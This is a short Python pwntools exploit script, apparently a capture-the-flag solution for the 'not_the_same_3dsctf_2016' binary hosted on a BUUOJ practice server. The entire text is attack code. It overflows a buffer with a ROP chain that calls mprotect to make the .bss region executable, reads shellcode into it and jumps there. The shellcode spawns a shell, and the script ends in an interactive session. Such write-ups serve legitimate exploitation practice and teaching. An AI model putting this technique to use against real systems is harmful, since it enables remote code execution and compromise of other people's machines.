from pwn import *

io = remote('node3.buuoj.cn',29774)
elf = ELF('./not_the_same_3dsctf_2016')
flag_addr = 0x80bc2a8

mprotect_addr = 0x806ed40
pop3_ret = 0x8063b9b
bss_addr = 0x80EB000
size = 0x1000
wrx = 0x7


read_addr = elf.symbols['read']
avg1 = 0
avg2 = 0x80eb000
avg3 = 0x100

shellcode = asm(shellcraft.sh())


payload = cyclic(0x2d)+p32(mprotect_addr)+p32(pop3_ret)+p32(bss_addr)+p32(size)+p32(wrx)
payload += p32(read_addr)
payload += p32(pop3_ret)
payload += p32(avg1)
payload += p32(avg2)
payload += p32(avg3)
payload += p32(bss_addr)

io.sendline(payload)
io.sendline(shellcode)
io.interactive()

